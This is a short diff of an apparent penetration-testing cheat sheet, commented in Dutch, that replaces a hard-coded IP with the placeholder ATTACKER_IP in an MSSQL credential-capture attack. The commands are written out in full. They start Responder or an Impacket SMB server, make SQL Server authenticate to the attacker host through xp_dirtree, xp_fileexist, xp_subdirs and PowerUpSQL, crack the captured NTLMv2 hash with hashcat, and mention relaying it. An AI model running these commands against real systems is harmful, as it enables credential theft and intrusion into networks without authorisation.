@@ -4,12 +4,12 @@ responder -I eth0 -wrf
 # Of Impacket smbserver:
 python3 smbserver.py share /tmp -smb2support
 # Stap 2: Trigger UNC path vanuit SQL (forceert NTLM auth naar aanvaller)
-EXEC master..xp_dirtree '\\10.0.0.1\share'
+EXEC master..xp_dirtree '\\ATTACKER_IP\share'
 # Alternatieven:
-EXEC master..xp_fileexist '\\10.0.0.1\share\test'
-EXEC master..xp_subdirs '\\10.0.0.1\share'
+EXEC master..xp_fileexist '\\ATTACKER_IP\share\test'
+EXEC master..xp_subdirs '\\ATTACKER_IP\share'
 # Via PowerUpSQL:
-powershell -c "Import-Module .\PowerUpSQL.ps1; Invoke-SQLUncPathInjection -CaptureIp 10.0.0.1"
+powershell -c "Import-Module .\PowerUpSQL.ps1; Invoke-SQLUncPathInjection -CaptureIp ATTACKER_IP"
 # Stap 3: Crack captured NTLMv2 hash
 hashcat -m 5600 captured_hash.txt wordlist.txt
 # Stap 4: Als SQL service draait als domain account - relay naar andere service
